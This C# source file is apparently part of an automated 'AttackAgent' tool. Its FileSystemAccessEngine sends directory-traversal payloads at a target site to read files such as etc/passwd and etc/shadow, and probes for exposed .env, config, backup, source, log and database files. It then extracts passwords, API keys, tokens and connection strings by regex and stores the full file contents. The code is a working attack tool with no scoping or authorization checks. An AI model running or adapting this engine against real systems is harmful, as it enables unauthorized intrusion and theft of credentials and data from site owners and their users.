using System.Text.RegularExpressions;
using System.Text.Json;
using System.IO.Compression;
using Serilog;

namespace AttackAgent.Engines
{
    /// <summary>
    /// Advanced file system access engine for comprehensive file and directory analysis
    /// Implements directory traversal, configuration file access, and sensitive data discovery
    /// </summary>
    public class FileSystemAccessEngine
    {
        private readonly string _target;
        private readonly HttpClient _httpClient;

        public FileSystemAccessEngine(string target, HttpClient httpClient)
        {
            _target = target;
            _httpClient = httpClient;
        }

        /// <summary>
        /// Comprehensive file system access testing
        /// </summary>
        public async Task<FileSystemAccessReport> PerformFileSystemAccessAsync()
        {
            Log.Information("📁 Starting comprehensive file system access testing...");
            
            var report = new FileSystemAccessReport
            {
                Target = _target,
                StartTime = DateTime.UtcNow
            };

            try
            {
                // Phase 1: Directory Traversal Testing
                Log.Information("🔍 Phase 1: Directory Traversal Testing");
                report.DirectoryTraversal = await TestDirectoryTraversalAsync();

                // Phase 2: Configuration File Access
                Log.Information("🔍 Phase 2: Configuration File Access");
                report.ConfigurationFiles = await AccessConfigurationFilesAsync();

                // Phase 3: Backup File Discovery
                Log.Information("🔍 Phase 3: Backup File Discovery");
                report.BackupFiles = await DiscoverBackupFilesAsync();

                // Phase 4: Source Code Access
                Log.Information("🔍 Phase 4: Source Code Access");
                report.SourceCodeFiles = await AccessSourceCodeFilesAsync();

                // Phase 5: Sensitive Data Discovery
                Log.Information("🔍 Phase 5: Sensitive Data Discovery");
                report.SensitiveData = await DiscoverSensitiveDataAsync();

                // Phase 6: Log File Access
                Log.Information("🔍 Phase 6: Log File Access");
                report.LogFiles = await AccessLogFilesAsync();

                // Phase 7: Database File Access
                Log.Information("🔍 Phase 7: Database File Access");
                report.DatabaseFiles = await AccessDatabaseFilesAsync();

                // Phase 8: Environment File Access
                Log.Information("🔍 Phase 8: Environment File Access");
                report.EnvironmentFiles = await AccessEnvironmentFilesAsync();

                report.EndTime = DateTime.UtcNow;
                report.Duration = report.EndTime - report.StartTime;

                Log.Information("✅ File system access testing completed in {Duration}ms", report.Duration.TotalMilliseconds);
                return report;
            }
            catch (Exception ex)
            {
                Log.Error(ex, "❌ Error during file system access testing");
                report.Error = ex.Message;
                return report;
            }
        }

        /// <summary>
        /// Test directory traversal vulnerabilities
        /// </summary>
        private async Task<DirectoryTraversalData> TestDirectoryTraversalAsync()
        {
            var traversalData = new DirectoryTraversalData();
            var traversalPayloads = new[]
            {
                "../", "../../", "../../../", "../../../../", "../../../../../",
                "..\\", "..\\..\\", "..\\..\\..\\", "..\\..\\..\\..\\", "..\\..\\..\\..\\..\\",
                "%2e%2e%2f", "%2e%2e%5c", "..%2f", "..%5c", "%2e%2e%2f%2e%2e%2f",
                "....//", "....\\\\", "..%252f", "..%255c", "%252e%252e%252f",
                "..%c0%af", "..%c1%9c", "..%c0%9v", "..%c1%pc"
            };

            var targetFiles = new[]
            {
                "windows/system32/drivers/etc/hosts",
                "etc/passwd", "etc/shadow", "etc/hosts", "etc/hostname",
                "proc/version", "proc/cpuinfo", "proc/meminfo",
                "appsettings.json", "web.config", "config.json",
                "database.sql", "backup.sql", "dump.sql"
            };

            foreach (var payload in traversalPayloads)
            {
                foreach (var targetFile in targetFiles)
                {
                    try
                    {
                        var testUrl = $"{_target.TrimEnd('/')}/{payload}{targetFile}";
                        var response = await _httpClient.GetAsync(testUrl);
                        
                        if (response.IsSuccessStatusCode)
                        {
                            var content = await response.Content.ReadAsStringAsync();
                            
                            // Check for sensitive content patterns
                            if (IsSensitiveContent(content))
                            {
                                traversalData.VulnerablePaths.Add(new VulnerablePath
                                {
                                    Payload = payload,
                                    TargetFile = targetFile,
                                    Url = testUrl,
                                    StatusCode = (int)response.StatusCode,
                                    Content = content,
                                    Sensitivity = AnalyzeSensitivity(content)
                                });
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Log.Debug("Directory traversal test failed for {Payload}{TargetFile}: {Error}", 
                            payload, targetFile, ex.Message);
                    }
                }
            }

            Log.Information("✅ Directory traversal testing completed. Found {Count} vulnerable paths", 
                traversalData.VulnerablePaths.Count);

            return traversalData;
        }

        /// <summary>
        /// Access configuration files
        /// </summary>
        private async Task<ConfigurationFileData> AccessConfigurationFilesAsync()
        {
            var configData = new ConfigurationFileData();
            var configFiles = new[]
            {
                // .NET Configuration
                "appsettings.json", "appsettings.Production.json", "appsettings.Development.json",
                "appsettings.Staging.json", "web.config", "app.config", "machine.config",
                
                // Environment Files
                ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
                "environment.json", "config.json", "settings.json", "configuration.json",
                
                // Docker Configuration
                "docker-compose.yml", "docker-compose.yaml", "Dockerfile", "dockerfile",
                ".dockerignore", "docker-compose.override.yml",
                
                // Package Management
                "package.json", "package-lock.json", "yarn.lock", "composer.json",
                "requirements.txt", "Pipfile", "poetry.lock", "pom.xml", "build.gradle",
                "Gemfile", "Gemfile.lock", "Cargo.toml", "go.mod", "go.sum",
                
                // Database Configuration
                "database.yml", "database.json", "db.json", "connection.json",
                "migrate.json", "seed.json", "schema.json",
                
                // Server Configuration
                "nginx.conf", "apache.conf", "httpd.conf", ".htaccess", "robots.txt",
                "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
                
                // Security Configuration
                "security.json", "auth.json", "permissions.json", "roles.json",
                "firewall.json", "ssl.json", "certificate.json",
                
                // Application Specific
                "application.json", "app.json", "main.json", "core.json",
                "bootstrap.json", "startup.json", "init.json"
            };

            foreach (var configFile in configFiles)
            {
                try
                {
                    var url = $"{_target.TrimEnd('/')}/{configFile}";
                    var response = await _httpClient.GetAsync(url);
                    
                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync();
                        var sensitiveData = ExtractSensitiveData(content);
                        
                        configData.AccessibleFiles.Add(new AccessibleFile
                        {
                            FileName = configFile,
                            Url = url,
                            StatusCode = (int)response.StatusCode,
                            Content = content,
                            SensitiveData = sensitiveData,
                            RiskLevel = CalculateRiskLevel(sensitiveData)
                        });
                    }
                }
                catch (Exception ex)
                {
                    Log.Debug("Configuration file access failed for {File}: {Error}", configFile, ex.Message);
                }
            }

            Log.Information("✅ Configuration file access completed. Found {Count} accessible files", 
                configData.AccessibleFiles.Count);

            return configData;
        }

        /// <summary>
        /// Discover backup files
        /// </summary>
        private async Task<BackupFileData> DiscoverBackupFilesAsync()
        {
            var backupData = new BackupFileData();
            var backupFiles = new[]
            {
                // Database Backups
                "backup.sql", "database.sql", "data.sql", "dump.sql", "export.sql",
                "backup.db", "database.db", "data.db", "dump.db", "export.db",
                "backup.sqlite", "database.sqlite", "data.sqlite", "dump.sqlite",
                
                // Archive Files
                "backup.zip", "backup.tar.gz", "backup.rar", "backup.7z",
                "database.zip", "data.zip", "dump.zip", "export.zip",
                "backup.tar", "backup.gz", "backup.bz2",
                
                // Versioned Files
                "backup_", "backup.", "backup-", "backup_old", "backup_new",
                "database_", "database.", "database-", "database_old",
                "data_", "data.", "data-", "data_old", "data_new",
                
                // Common Extensions
                ".bak", ".backup", ".old", ".orig", ".copy", ".tmp", ".temp",
                ".bak1", ".bak2", ".bak3", ".backup1", ".backup2", ".backup3",
                
                // Timestamped Files
                "backup_2024", "backup_2023", "backup_2022", "backup_2021",
                "database_2024", "database_2023", "database_2022", "database_2021",
                "data_2024", "data_2023", "data_2022", "data_2021",
                
                // System Backups
                "system_backup", "config_backup", "settings_backup", "app_backup",
                "user_backup", "admin_backup", "root_backup", "www_backup"
            };

            foreach (var backupFile in backupFiles)
            {
                try
                {
                    var url = $"{_target.TrimEnd('/')}/{backupFile}";
                    var response = await _httpClient.GetAsync(url);
                    
                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync();
                        var fileSize = response.Content.Headers.ContentLength ?? 0;
                        var sensitiveData = ExtractSensitiveData(content);
                        
                        backupData.DiscoveredFiles.Add(new DiscoveredFile
                        {
                            FileName = backupFile,
                            Url = url,
                            StatusCode = (int)response.StatusCode,
                            FileSize = fileSize,
                            Content = content,
                            SensitiveData = sensitiveData,
                            RiskLevel = CalculateRiskLevel(sensitiveData)
                        });
                    }
                }
                catch (Exception ex)
                {
                    Log.Debug("Backup file discovery failed for {File}: {Error}", backupFile, ex.Message);
                }
            }

            Log.Information("✅ Backup file discovery completed. Found {Count} backup files", 
                backupData.DiscoveredFiles.Count);

            return backupData;
        }

        /// <summary>
        /// Access source code files
        /// </summary>
        private async Task<SourceCodeData> AccessSourceCodeFilesAsync()
        {
            var sourceData = new SourceCodeData();
            var sourceFiles = new[]
            {
                // Web Files
                "index.php", "index.html", "index.asp", "index.aspx", "index.jsp",
                "main.php", "main.html", "main.asp", "main.aspx", "main.jsp",
                "home.php", "home.html", "home.asp", "home.aspx", "home.jsp",
                
                // Application Files
                "app.py", "main.py", "server.py", "application.py", "run.py",
                "app.js", "main.js", "server.js", "application.js", "index.js",
                "app.cs", "Program.cs", "Startup.cs", "Main.cs", "Application.cs",
                "app.java", "Main.java", "Application.java", "Server.java", "App.java",
                "app.cpp", "main.cpp", "server.cpp", "application.cpp", "main.c",
                "app.go", "main.go", "server.go", "application.go", "main.rs",
                "app.rb", "main.rb", "server.rb", "application.rb", "main.pl",
                
                // Configuration Files
                "config.php", "config.py", "config.js", "config.cs", "config.java",
                "settings.php", "settings.py", "settings.js", "settings.cs", "settings.java",
                "database.php", "database.py", "database.js", "database.cs", "database.java",
                
                // Library Files
                "lib.php", "lib.py", "lib.js", "lib.cs", "lib.java",
                "utils.php", "utils.py", "utils.js", "utils.cs", "utils.java",
                "helpers.php", "helpers.py", "helpers.js", "helpers.cs", "helpers.java",
                
                // Test Files
                "test.php", "test.py", "test.js", "test.cs", "test.java",
                "tests.php", "tests.py", "tests.js", "tests.cs", "tests.java",
                "spec.php", "spec.py", "spec.js", "spec.cs", "spec.java"
            };

            foreach (var sourceFile in sourceFiles)
            {
                try
                {
                    var url = $"{_target.TrimEnd('/')}/{sourceFile}";
                    var response = await _httpClient.GetAsync(url);
                    
                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync();
                        var sensitiveData = ExtractSensitiveData(content);
                        var codeAnalysis = AnalyzeSourceCode(content, sourceFile);
                        
                        sourceData.AccessibleFiles.Add(new SourceCodeFile
                        {
                            FileName = sourceFile,
                            Url = url,
                            StatusCode = (int)response.StatusCode,
                            Content = content,
                            SensitiveData = sensitiveData,
                            CodeAnalysis = codeAnalysis,
                            RiskLevel = CalculateRiskLevel(sensitiveData)
                        });
                    }
                }
                catch (Exception ex)
                {
                    Log.Debug("Source code access failed for {File}: {Error}", sourceFile, ex.Message);
                }
            }

            Log.Information("✅ Source code access completed. Found {Count} accessible files", 
                sourceData.AccessibleFiles.Count);

            return sourceData;
        }

        /// <summary>
        /// Discover sensitive data
        /// </summary>
        private async Task<SensitiveDataDiscovery> DiscoverSensitiveDataAsync()
        {
            var sensitiveData = new SensitiveDataDiscovery();
            var sensitiveFiles = new[]
            {
                // Password Files
                "password.txt", "passwords.txt", "users.txt", "accounts.txt",
                "login.txt", "credentials.txt", "auth.txt", "authentication.txt",
                
                // Secret Files
                "secrets.txt", "secret.txt", "keys.txt", "key.txt", "private.txt",
                "confidential.txt", "internal.txt", "restricted.txt", "secure.txt",
                
                // Database Files
                "database.txt", "db.txt", "sql.txt", "dump.txt", "export.txt",
                "schema.txt", "tables.txt", "users.txt", "admin.txt",
                
                // Log Files
                "logs.txt", "log.txt", "error.log", "access.log", "debug.log",
                "system.log", "application.log", "security.log", "audit.log",
                
                // Configuration Files
                "config.txt", "settings.txt", "configuration.txt", "setup.txt",
                "install.txt", "deploy.txt", "production.txt", "staging.txt"
            };

            foreach (var sensitiveFile in sensitiveFiles)
            {
                try
                {
                    var url = $"{_target.TrimEnd('/')}/{sensitiveFile}";
                    var response = await _httpClient.GetAsync(url);
                    
                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync();
                        var extractedData = ExtractSensitiveData(content);
                        
                        if (extractedData.Any())
                        {
                            sensitiveData.DiscoveredFiles.Add(new SensitiveFile
                            {
                                FileName = sensitiveFile,
                                Url = url,
                                StatusCode = (int)response.StatusCode,
                                Content = content,
                                SensitiveData = extractedData,
                                RiskLevel = CalculateRiskLevel(extractedData)
                            });
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log.Debug("Sensitive data discovery failed for {File}: {Error}", sensitiveFile, ex.Message);
                }
            }

            Log.Information("✅ Sensitive data discovery completed. Found {Count} files with sensitive data", 
                sensitiveData.DiscoveredFiles.Count);

            return sensitiveData;
        }

        /// <summary>
        /// Access log files
        /// </summary>
        private async Task<LogFileData> AccessLogFilesAsync()
        {
            var logData = new LogFileData();
            var logFiles = new[]
            {
                "access.log", "error.log", "debug.log", "system.log", "application.log",
                "security.log", "audit.log", "auth.log", "login.log", "admin.log",
                "web.log", "server.log", "apache.log", "nginx.log", "iis.log",
                "php.log", "python.log", "node.log", "java.log", "csharp.log",
                "database.log", "db.log", "sql.log", "mysql.log", "postgres.log",
                "mongodb.log", "redis.log", "elasticsearch.log", "kibana.log"
            };

            foreach (var logFile in logFiles)
            {
                try
                {
                    var url = $"{_target.TrimEnd('/')}/{logFile}";
                    var response = await _httpClient.GetAsync(url);
                    
                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync();
                        var logAnalysis = AnalyzeLogContent(content);
                        
                        logData.AccessibleFiles.Add(new LogFile
                        {
                            FileName = logFile,
                            Url = url,
                            StatusCode = (int)response.StatusCode,
                            Content = content,
                            LogAnalysis = logAnalysis,
                            RiskLevel = CalculateLogRiskLevel(logAnalysis)
                        });
                    }
                }
                catch (Exception ex)
                {
                    Log.Debug("Log file access failed for {File}: {Error}", logFile, ex.Message);
                }
            }

            Log.Information("✅ Log file access completed. Found {Count} accessible log files", 
                logData.AccessibleFiles.Count);

            return logData;
        }

        /// <summary>
        /// Access database files
        /// </summary>
        private async Task<DatabaseFileData> AccessDatabaseFilesAsync()
        {
            var dbData = new DatabaseFileData();
            var dbFiles = new[]
            {
                "database.sql", "data.sql", "dump.sql", "export.sql", "backup.sql",
                "database.db", "data.db", "dump.db", "export.db", "backup.db",
                "database.sqlite", "data.sqlite", "dump.sqlite", "export.sqlite",
                "database.mdb", "data.mdb", "dump.mdb", "export.mdb",
                "database.accdb", "data.accdb", "dump.accdb", "export.accdb"
            };

            foreach (var dbFile in dbFiles)
            {
                try
                {
                    var url = $"{_target.TrimEnd('/')}/{dbFile}";
                    var response = await _httpClient.GetAsync(url);
                    
                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync();
                        var dbAnalysis = AnalyzeDatabaseContent(content);
                        
                        dbData.AccessibleFiles.Add(new DatabaseFile
                        {
                            FileName = dbFile,
                            Url = url,
                            StatusCode = (int)response.StatusCode,
                            Content = content,
                            DatabaseAnalysis = dbAnalysis,
                            RiskLevel = CalculateDatabaseRiskLevel(dbAnalysis)
                        });
                    }
                }
                catch (Exception ex)
                {
                    Log.Debug("Database file access failed for {File}: {Error}", dbFile, ex.Message);
                }
            }

            Log.Information("✅ Database file access completed. Found {Count} accessible database files", 
                dbData.AccessibleFiles.Count);

            return dbData;
        }

        /// <summary>
        /// Access environment files
        /// </summary>
        private async Task<EnvironmentFileData> AccessEnvironmentFilesAsync()
        {
            var envData = new EnvironmentFileData();
            var envFiles = new[]
            {
                ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
                ".env.test", ".env.prod", ".env.dev", ".env.stage", ".env.qa",
                "environment.json", "env.json", "config.json", "settings.json",
                "environment.yml", "env.yml", "config.yml", "settings.yml",
                "environment.yaml", "env.yaml", "config.yaml", "settings.yaml"
            };

            foreach (var envFile in envFiles)
            {
                try
                {
                    var url = $"{_target.TrimEnd('/')}/{envFile}";
                    var response = await _httpClient.GetAsync(url);
                    
                    if (response.IsSuccessStatusCode)
                    {
                        var content = await response.Content.ReadAsStringAsync();
                        var envAnalysis = AnalyzeEnvironmentContent(content);
                        
                        envData.AccessibleFiles.Add(new EnvironmentFile
                        {
                            FileName = envFile,
                            Url = url,
                            StatusCode = (int)response.StatusCode,
                            Content = content,
                            EnvironmentAnalysis = envAnalysis,
                            RiskLevel = CalculateEnvironmentRiskLevel(envAnalysis)
                        });
                    }
                }
                catch (Exception ex)
                {
                    Log.Debug("Environment file access failed for {File}: {Error}", envFile, ex.Message);
                }
            }

            Log.Information("✅ Environment file access completed. Found {Count} accessible environment files", 
                envData.AccessibleFiles.Count);

            return envData;
        }

        // Helper methods
        private bool IsSensitiveContent(string content)
        {
            var sensitivePatterns = new[]
            {
                @"password\s*[:=]\s*['""]?[^'""\s]+['""]?",
                @"api[_-]?key\s*[:=]\s*['""]?[^'""\s]+['""]?",
                @"secret\s*[:=]\s*['""]?[^'""\s]+['""]?",
                @"token\s*[:=]\s*['""]?[^'""\s]+['""]?",
                @"connection\s*string\s*[:=]\s*['""]?[^'""\s]+['""]?",
                @"database\s*[:=]\s*['""]?[^'""\s]+['""]?",
                @"username\s*[:=]\s*['""]?[^'""\s]+['""]?",
                @"user\s*[:=]\s*['""]?[^'""\s]+['""]?",
                @"admin\s*[:=]\s*['""]?[^'""\s]+['""]?",
                @"root\s*[:=]\s*['""]?[^'""\s]+['""]?"
            };

            return sensitivePatterns.Any(pattern => Regex.IsMatch(content, pattern, RegexOptions.IgnoreCase));
        }

        private string AnalyzeSensitivity(string content)
        {
            var sensitivity = "Low";
            
            if (content.Contains("password", StringComparison.OrdinalIgnoreCase) ||
                content.Contains("secret", StringComparison.OrdinalIgnoreCase) ||
                content.Contains("api", StringComparison.OrdinalIgnoreCase))
            {
                sensitivity = "High";
            }
            else if (content.Contains("config", StringComparison.OrdinalIgnoreCase) ||
                     content.Contains("setting", StringComparison.OrdinalIgnoreCase))
            {
                sensitivity = "Medium";
            }

            return sensitivity;
        }

        private List<string> ExtractSensitiveData(string content)
        {
            var sensitiveData = new List<string>();
            var patterns = new Dictionary<string, string>
            {
                ["API Key"] = @"(?:api[_-]?key|apikey)\s*[:=]\s*['""]?([^'""\s]+)['""]?",
                ["Password"] = @"(?:password|passwd|pwd)\s*[:=]\s*['""]?([^'""\s]+)['""]?",
                ["Secret"] = @"(?:secret|secrets)\s*[:=]\s*['""]?([^'""\s]+)['""]?",
                ["Token"] = @"(?:token|tokens)\s*[:=]\s*['""]?([^'""\s]+)['""]?",
                ["Database"] = @"(?:database|db)\s*[:=]\s*['""]?([^'""\s]+)['""]?",
                ["Username"] = @"(?:username|user)\s*[:=]\s*['""]?([^'""\s]+)['""]?",
                ["Connection String"] = @"(?:connection[_-]?string|conn[_-]?string)\s*[:=]\s*['""]?([^'""\s]+)['""]?",
                ["Admin"] = @"(?:admin|administrator)\s*[:=]\s*['""]?([^'""\s]+)['""]?",
                ["Root"] = @"(?:root)\s*[:=]\s*['""]?([^'""\s]+)['""]?"
            };

            foreach (var pattern in patterns)
            {
                var matches = Regex.Matches(content, pattern.Value, RegexOptions.IgnoreCase);
                foreach (Match match in matches)
                {
                    if (match.Groups.Count > 1)
                    {
                        sensitiveData.Add($"{pattern.Key}: {match.Groups[1].Value}");
                    }
                }
            }

            return sensitiveData;
        }

        private string CalculateRiskLevel(List<string> sensitiveData)
        {
            if (sensitiveData.Count == 0) return "Low";
            if (sensitiveData.Count >= 5) return "Critical";
            if (sensitiveData.Count >= 3) return "High";
            if (sensitiveData.Count >= 1) return "Medium";
            return "Low";
        }

        private Dictionary<string, object> AnalyzeSourceCode(string content, string fileName)
        {
            var analysis = new Dictionary<string, object>();
            
            // Basic code analysis
            analysis["Lines"] = content.Split('\n').Length;
            analysis["Characters"] = content.Length;
            analysis["Language"] = DetectProgrammingLanguage(fileName);
            
            // Security patterns
            var securityPatterns = new[]
            {
                "password", "secret", "api", "key", "token", "auth", "login",
                "sql", "query", "execute", "eval", "system", "exec", "shell"
            };
            
            var foundPatterns = securityPatterns.Where(pattern => 
                content.Contains(pattern, StringComparison.OrdinalIgnoreCase)).ToList();
            
            analysis["SecurityPatterns"] = foundPatterns;
            analysis["SecurityScore"] = foundPatterns.Count;

            return analysis;
        }

        private string DetectProgrammingLanguage(string fileName)
        {
            var extension = Path.GetExtension(fileName).ToLower();
            return extension switch
            {
                ".php" => "PHP",
                ".py" => "Python",
                ".js" => "JavaScript",
                ".cs" => "C#",
                ".java" => "Java",
                ".cpp" => "C++",
                ".c" => "C",
                ".go" => "Go",
                ".rs" => "Rust",
                ".rb" => "Ruby",
                ".pl" => "Perl",
                ".html" => "HTML",
                ".asp" => "ASP",
                ".aspx" => "ASP.NET",
                ".jsp" => "JSP",
                _ => "Unknown"
            };
        }

        private Dictionary<string, object> AnalyzeLogContent(string content)
        {
            var analysis = new Dictionary<string, object>();
            
            analysis["Lines"] = content.Split('\n').Length;
            analysis["Characters"] = content.Length;
            
            // Look for sensitive information in logs
            var sensitivePatterns = new[]
            {
                "password", "secret", "api", "key", "token", "auth", "login",
                "error", "exception", "stack", "trace", "debug", "info"
            };
            
            var foundPatterns = sensitivePatterns.Where(pattern => 
                content.Contains(pattern, StringComparison.OrdinalIgnoreCase)).ToList();
            
            analysis["SensitivePatterns"] = foundPatterns;
            analysis["SensitivityScore"] = foundPatterns.Count;

            return analysis;
        }

        private string CalculateLogRiskLevel(Dictionary<string, object> logAnalysis)
        {
            var sensitivityScore = (int)logAnalysis.GetValueOrDefault("SensitivityScore", 0);
            return sensitivityScore switch
            {
                >= 10 => "Critical",
                >= 5 => "High",
                >= 2 => "Medium",
                _ => "Low"
            };
        }

        private Dictionary<string, object> AnalyzeDatabaseContent(string content)
        {
            var analysis = new Dictionary<string, object>();
            
            analysis["Lines"] = content.Split('\n').Length;
            analysis["Characters"] = content.Length;
            
            // Look for sensitive database information
            var sensitivePatterns = new[]
            {
                "password", "secret", "api", "key", "token", "auth", "login",
                "user", "admin", "root", "database", "table", "column"
            };
            
            var foundPatterns = sensitivePatterns.Where(pattern => 
                content.Contains(pattern, StringComparison.OrdinalIgnoreCase)).ToList();
            
            analysis["SensitivePatterns"] = foundPatterns;
            analysis["SensitivityScore"] = foundPatterns.Count;

            return analysis;
        }

        private string CalculateDatabaseRiskLevel(Dictionary<string, object> dbAnalysis)
        {
            var sensitivityScore = (int)dbAnalysis.GetValueOrDefault("SensitivityScore", 0);
            return sensitivityScore switch
            {
                >= 8 => "Critical",
                >= 4 => "High",
                >= 2 => "Medium",
                _ => "Low"
            };
        }

        private Dictionary<string, object> AnalyzeEnvironmentContent(string content)
        {
            var analysis = new Dictionary<string, object>();
            
            analysis["Lines"] = content.Split('\n').Length;
            analysis["Characters"] = content.Length;
            
            // Look for environment variables and sensitive data
            var sensitivePatterns = new[]
            {
                "password", "secret", "api", "key", "token", "auth", "login",
                "database", "db", "connection", "url", "host", "port"
            };
            
            var foundPatterns = sensitivePatterns.Where(pattern => 
                content.Contains(pattern, StringComparison.OrdinalIgnoreCase)).ToList();
            
            analysis["SensitivePatterns"] = foundPatterns;
            analysis["SensitivityScore"] = foundPatterns.Count;

            return analysis;
        }

        private string CalculateEnvironmentRiskLevel(Dictionary<string, object> envAnalysis)
        {
            var sensitivityScore = (int)envAnalysis.GetValueOrDefault("SensitivityScore", 0);
            return sensitivityScore switch
            {
                >= 6 => "Critical",
                >= 3 => "High",
                >= 1 => "Medium",
                _ => "Low"
            };
        }
    }

    // Data models for file system access results
    public class FileSystemAccessReport
    {
        public string Target { get; set; } = string.Empty;
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public TimeSpan Duration { get; set; }
        public string? Error { get; set; }
        
        public DirectoryTraversalData? DirectoryTraversal { get; set; }
        public ConfigurationFileData? ConfigurationFiles { get; set; }
        public BackupFileData? BackupFiles { get; set; }
        public SourceCodeData? SourceCodeFiles { get; set; }
        public SensitiveDataDiscovery? SensitiveData { get; set; }
        public LogFileData? LogFiles { get; set; }
        public DatabaseFileData? DatabaseFiles { get; set; }
        public EnvironmentFileData? EnvironmentFiles { get; set; }
    }

    public class DirectoryTraversalData
    {
        public List<VulnerablePath> VulnerablePaths { get; set; } = new();
    }

    public class VulnerablePath
    {
        public string Payload { get; set; } = string.Empty;
        public string TargetFile { get; set; } = string.Empty;
        public string Url { get; set; } = string.Empty;
        public int StatusCode { get; set; }
        public string Content { get; set; } = string.Empty;
        public string Sensitivity { get; set; } = string.Empty;
    }

    public class ConfigurationFileData
    {
        public List<AccessibleFile> AccessibleFiles { get; set; } = new();
    }

    public class BackupFileData
    {
        public List<DiscoveredFile> DiscoveredFiles { get; set; } = new();
    }

    public class SourceCodeData
    {
        public List<SourceCodeFile> AccessibleFiles { get; set; } = new();
    }

    public class SensitiveDataDiscovery
    {
        public List<SensitiveFile> DiscoveredFiles { get; set; } = new();
    }

    public class LogFileData
    {
        public List<LogFile> AccessibleFiles { get; set; } = new();
    }

    public class DatabaseFileData
    {
        public List<DatabaseFile> AccessibleFiles { get; set; } = new();
    }

    public class EnvironmentFileData
    {
        public List<EnvironmentFile> AccessibleFiles { get; set; } = new();
    }

    public class AccessibleFile
    {
        public string FileName { get; set; } = string.Empty;
        public string Url { get; set; } = string.Empty;
        public int StatusCode { get; set; }
        public string Content { get; set; } = string.Empty;
        public List<string> SensitiveData { get; set; } = new();
        public string RiskLevel { get; set; } = string.Empty;
    }

    public class DiscoveredFile
    {
        public string FileName { get; set; } = string.Empty;
        public string Url { get; set; } = string.Empty;
        public int StatusCode { get; set; }
        public long FileSize { get; set; }
        public string Content { get; set; } = string.Empty;
        public List<string> SensitiveData { get; set; } = new();
        public string RiskLevel { get; set; } = string.Empty;
    }

    public class SourceCodeFile : AccessibleFile
    {
        public Dictionary<string, object> CodeAnalysis { get; set; } = new();
    }

    public class SensitiveFile : AccessibleFile
    {
        // Inherits from AccessibleFile
    }

    public class LogFile : AccessibleFile
    {
        public Dictionary<string, object> LogAnalysis { get; set; } = new();
    }

    public class DatabaseFile : AccessibleFile
    {
        public Dictionary<string, object> DatabaseAnalysis { get; set; } = new();
    }

    public class EnvironmentFile : AccessibleFile
    {
        public Dictionary<string, object> EnvironmentAnalysis { get; set; } = new();
    }
}
